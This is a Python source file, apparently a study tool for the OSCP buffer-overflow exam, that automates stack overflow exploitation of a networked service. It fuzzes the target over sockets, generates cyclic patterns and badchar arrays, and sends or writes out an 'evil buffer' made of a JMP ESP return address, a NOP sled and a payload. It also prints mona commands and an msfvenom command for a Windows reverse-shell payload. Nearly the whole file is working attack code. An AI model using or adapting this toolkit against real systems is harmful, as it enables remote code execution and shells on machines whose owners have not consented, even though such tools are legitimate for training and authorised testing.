"""
OSCP Buffer Overflow ToolBox --- @AlrikRr

This script use some code from :
    - TryHackMe - OSCP OverflowPrep
    - sub-sub-command.py from @jirihnidek
    - And of course StackOverflow because argparse is a pain in the parse.


To-Do :

- Resolve Payload encoding problem ( Maybe bcause of the \\ ) exploit_init 
"""

import argparse
import sys, socket, time
import string, os

def main(args):
    """
    Main function
    Check which module was used by the user
    """
    #print(args)
    argv_len = len( vars(args))
    if argv_len == 0:
        print("Empty input, use -h for more information")
        exit(0)
    if args.which == 'fuzz':
        fuzzer(args.ip, args.port, args.prefix, args.timeout, args.accumulator, args.letter)
    elif args.which == 'pattern':
        pattern(args.size, args.output)
    elif args.which == 'badchar':
        badchar(args.badchars)
    elif args.which == 'exploit':
        exploit_init(args.ip, args.port, args.prefix, args.offset, args.retn, args.padding, args.junk, args.payload, args.generate)
    elif args.which == 'mona':
        mona()
    else:
        print(error("Invalid Module Name"))

def fuzzer(ip, port, prefix, timeout, acc, letter):
    """
    Fuzzer module code

    Param:
    - ip : string
    - port : int
    - prefix : string
    - timeout : int
    - acc : int
    - letter : string
    """
    ## Fuzzer code
    prefix = prefix+" "
    string = prefix + letter * acc #Default : prefix + 'A' * 100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print(warning("Fuzzing with {} bytes".format(len(string) - len(prefix))))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print(confirm("Fuzzing crashed at {} bytes".format(len(string) - len(prefix))))
            sys.exit(0)
        string += acc * letter
        time.sleep(1)


def pattern(size, output):
    """
    Pattern generator code ( Looks like a garbage code but it's working !)

    Param:
    - size : int 
    - output : string
    """
    print(warning("If the pattern doesn't work well try :"))
    print(warning("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <SIZE> \n"))
    dig_list = list(string.digits) 
    low_list = list(string.ascii_lowercase)
    upp_list = list(string.ascii_uppercase)

    if output is None or output == 'pattern.txt':
        output="pattern.txt"
        print(warning("Default name file : pattern.txt"))

    dig_c = 0
    low_c = 0
    upp_c = 0
    _c = 0 

    bool_low = 0
    bool_upp = 0
    pattern = ""
    size = size - 1
    while True:
        # Loop 1 : UPPERCASE list
        for upp in upp_list:
            # Means we reach end of the uppercase list
            # Evrything to index 0
            if upp_c == 25:
                upp_c = 0
            # index =1 for uppercase list of lowercase ends
            elif bool_upp == 1:
                upp_c = upp_c + 1
                bool_upp = 0
                bool_low = 0
                low_c = 0
            else:
                pass
            # Loop 2: LOWECASE list
            for low in low_list:
                # Means that we reach the end of the lowerase list
                # index +1 for the uppercase list
                if low_c == 25:
                    low_c = 0
                    bool_upp = 1
                # +1 index lowercase list if digits list ends
                elif bool_low == 1:
                    low_c = low_c + 1
                    bool_low = 0
                else:
                    pass
                # Loop 3: DIGITS list
                for dig in dig_list:
                    # Means that we reach the end o the digits list
                    # index +1 for the lowercase list 
                    if dig_c > len(dig_list)-1:
                        dig_c = 0
                        bool_low = 1
                        break
                    # Check the size of the pattern everytime a char is added to it
                    # If not the and, size counter (_c) ++
                    if _c <= size:
                        _c = _c + 1
                        pattern = pattern + upp_list[upp_c]
                        if _c <= size:
                            _c = _c + 1
                            pattern = pattern + low_list[low_c]
                            if _c <= size:
                                _c = _c + 1
                                pattern = pattern + dig_list[dig_c]
                                dig_c = dig_c + 1
                            else:
                                # Else that means we reach the wanted size for the pattern, we stop the program and print the patterm
                                print(pattern)
                                if output is not None:
                                    outToFile(output,pattern)
                                exit(0)
                        else:
                            print(pattern)
                            if output is not None:
                                outToFile(output,pattern)
                            exit(0)
                    else:
                        print(pattern)
                        if output is not None:
                            outToFile(output,pattern)
                        exit(0)

def badchar(badchars):
    """
    Badchar generator code

    Param:
    - badchars : string
    """

    byte_array = badchars.split("\\x")

    print(warning("Generating badchar array ...\n"))

    for x in range(1, 256):
            byte = "{:02x}".format(x)
            if byte not in byte_array:
                    print("\\x"+byte, end='')

def exploit_init(ip, port, prefix, offset, retn, padding, junk, payload, generate):
    """
    Exploit code : Parse and check error before exploit

    Junk == Pattern
    """
    # Execute the python code
    prefix = prefix+" "
    overflow = "A" * offset
    postfix = ""
    payload_out = ""
    isJunk=0
    
    if junk != '' and payload == '':
        # Check if junk file exist
        if os.path.isfile(junk):
            print(confirm("Pattern file "+junk+" loaded"))
            with open(junk,'r') as junk_f:
                # Open pattern.txt and store it under payload
                payload = junk_f.read().rstrip()
        else:
            print(error("Pattern "+junk+" not found"))
            exit()     
        # This boolean is used to change the generated python file (if pattern or payload set, the output will be different)
        isJunk = 1
        print(confirm("Pattern in Payload: "+ junk))
    elif payload != '' and junk == '' and offset != 0:
        # Check if payload file exist
        if os.path.isfile(payload) :
            print(confirm("Payload file: " + payload))
            
            if generate is False:
                with open(payload,"r") as payload_f: x = payload_f.read().splitlines()
                for line in x: payload_out = payload_out+line
                payload_out = payload_out.replace("\"", "")
            else:
                with open(payload,"r") as payload_f: payload_string = payload_f.read().splitlines()
                payload_string= payload_string.rstrip()
                payload_string = "("+payload_string+")"
                    
        else:
            print(error("Payload "+payload+" not found"))
            exit()
    elif junk == '' and payload == '' and offset == 0:
        print(error("No pattern or Payload or Offset was set, try pattern module or msfvenom exploit"))
        exit()
    else:
        pass

    if generate is False:
        exploit(ip,port,prefix,overflow,retn,padding,payload_out,postfix)
    else:
         # Generate the python file
        exploit_gen(ip,port,prefix,offset,retn,padding,payload,postfix,isJunk)    
    return

def exploit(ip,port,prefix,overflow,retn,padding,payload,postfix):
    """
    Start Exploit
    """
    print(confirm("Starting exploit ..."))
    padding_exploit = "\x90" * padding
    buffer = prefix + overflow + retn + padding_exploit + payload + postfix
    #print(buffer)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, int(port)))
        print(confirm("Sending evil buffer..."))
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print(confirm("Exploit Done !"))
    except:
        print(error("Could not connect."))
        exit()

def exploit_gen(ip,port,prefix,offset,retn,padding,payload,postfix,isJunk):
    """
    Start exploit generator exploit.py
    """
    overflow = "overflow =  \"A\" * offset"
        
    if padding == 0:
        padding_gen = "padding = \"\""
    else:
        padding_gen = "padding = \"\\x90\" * "+str(padding)

    if isJunk == 1:
        payload = "\""+payload+"\""
    
    if payload == '':
        payload = "\"\""

    print(confirm("Generating exploit.py ..."))
    with open('exploit.py','w') as f:
        f.write("# Generated exploit.py @AlrikRr\n")
        f.write("""
import socket\n
ip = \""""+ip+"""\"
port = """+str(port)+"""

prefix = \""""+prefix+"""\"
offset = """+str(offset)+"""
"""+overflow+"""
retn = \""""+retn+"""\"
"""+padding_gen+"""
payload = """+payload+"""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\\r\\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")""")
    print(confirm("exploit.py"))
    
    

def mona():
    """
    Mona commands
    """
    print("\033[1;34;40m # --- Setup working directory : \033[0m \n")
    print("\033[0;32;40m !mona config -set workingfolder c:\mona\%p \033[0m \n")
    print("\033[1;34;40m # --- Find EIP offet \033[0m \n")
    print("\033[0;32;40m !mona findmsp -distance <buffer size> \033[0m \n")
    print("\033[1;34;40m # --- Generate bytarray and exclude badhars \033[0m \n")
    print("\033[0;32;40m !mona bytearray -b \"\\x00\" \033[0m \n")
    print("\033[1;34;40m # --- Compare bytarray and ESP address buffer to find badchars \033[0m \n")
    print("\033[0;32;40m !mona compare -f C:\mona\oscp\bytearray.bin -a <address ESP> \033[0m \n")
    print("\033[1;34;40m # --- Search JMP ESP and exclude badchar \033[0m \n")
    print("\033[0;32;40m !mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\" \033[0m \n")
    print("\033[1;34;40m # --- MSF generate msfvenom payload \033[0m \n")
    print("\033[0;32;40m msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b \"YOUR BADCHAR\" -f c \033[0m \n")

## --- Usefull functions --- ##

def error(cause):
    """
    Display error msg (Red)
    """
    return ("\033[1;31;40m [-] "+cause+" \033[0m ")

def confirm(cause):
    """
    Display confirm msg (Green)
    """
    return ("\033[1;32;40m [+] "+cause + " \033[0m ")

def warning(cause):
    """
    Display warning msg (Yellow)
    """
    return ("\033[1;33;40m [!] "+cause+" \033[0m")

def outToFile(output,toWrite):
    """
    Write toWrite into output file
    """
    # Check if file exit and print error
    if os.path.isfile(output) :
        print(error("The file name already exist !"))
    else:
        with open(output, 'a') as outfile:
            outfile.write(toWrite)
            print(confirm("Output write as "+output))
    return

## --- argparse if --- ##

if __name__ == '__main__':
    # create the top-level parser
    parser = argparse.ArgumentParser(prog='OSCPBuff.py',usage='%(prog)s [MODULE] [OPTIONS]')

    # create sub-parser
    sub_parsers = parser.add_subparsers(help='module description')

    # create the parser for the "fuzz" sub-command
    parser_fuzz = sub_parsers.add_parser('fuzz', help='Fuzzing tool')
    parser_fuzz.add_argument('-i','--ip',required=True, help='set IP of TARGET')
    parser_fuzz.add_argument('-p','--port',required=True, type=int, help='set PORT of TARGET')
    parser_fuzz.add_argument('-x','--prefix',required=True, help='set PREFIX like OVERFLOW1')
    parser_fuzz.add_argument('-t','--timeout', nargs='?', default=5, type=int, help='set the TIMEOUT socket ')
    parser_fuzz.add_argument('-a','--accumulator', nargs='?', default=100, type=int, help='set the ACCUMULATOR for the fuzzing buffer')
    parser_fuzz.add_argument('-l','--letter', nargs='?', default='A', type=str, help='set the LETTER used fo the buffer, ex: A' )
    parser_fuzz.set_defaults(which='fuzz')

    # create the parser for the "pattern" sub-command
    parser_pattern = sub_parsers.add_parser('pattern', help='Pattern generator tool')
    parser_pattern.add_argument('-s','--size',required=True,type=int, help='SIZE of the pattern, default output pattern.txt')
    parser_pattern.add_argument('-o','--output', nargs='?', default='pattern.txt', help='wite the pattern into an OUTPUT file other than pattern.txt')
    parser_pattern.set_defaults(which='pattern')

    # create the parse for the "badchar" sub-command
    parser_badchar = sub_parsers.add_parser('badchar', help='Badchar tool, create bytarray and exclude some badchar')
    parser_badchar.add_argument('badchars',  type=str, nargs='?', default="\x00", help='please, respect the syntax : \"\\x00\\x5f\\x40\"...')
    parser_badchar.set_defaults(which='badchar')

    # create the parse for the "exploit" sub-command
    parser_exploit = sub_parsers.add_parser('exploit', help='exploit the buffer overflow !')
    parser_exploit.add_argument('-i','--ip', required=True, help='set IP of the TARGET')
    parser_exploit.add_argument('-p','--port',required=True, help='set PORT of the TARGET')
    parser_exploit.add_argument('-x','--prefix',required=True, help='set PREFIX like : OVERFLOW1')
    parser_exploit.add_argument('-s','--offset', default=0, type=int, help='set OFFSET of the buffer')
    parser_exploit.add_argument('-r','--retn',default='', help='set RETN of buffer (JMP ESP)')
    parser_exploit.add_argument('-d','--padding', default=0, type=int, help='set the number of x90')
    parser_exploit.add_argument('-j', '--junk', metavar='pattern.txt',default='', help='set the Pattern Junk to figure out EIP address. Mustbi in a file.txt')
    parser_exploit.add_argument('-y','--payload',metavar='payload.txt', default='', help='set the PAYLOAD of the buffer. Must be in a file.txt')
    parser_exploit.add_argument('--generate', default=False, action="store_true", help='generate a exploit.py file but don\'t execute the exploit')
    parser_exploit.set_defaults(which='exploit')

    # create the parse for the "mona" sub-command
    parser_mona = sub_parsers.add_parser('mona', help='display mona commands')
    parser_mona.set_defaults(which='mona')

    args = parser.parse_args()
    main(args)
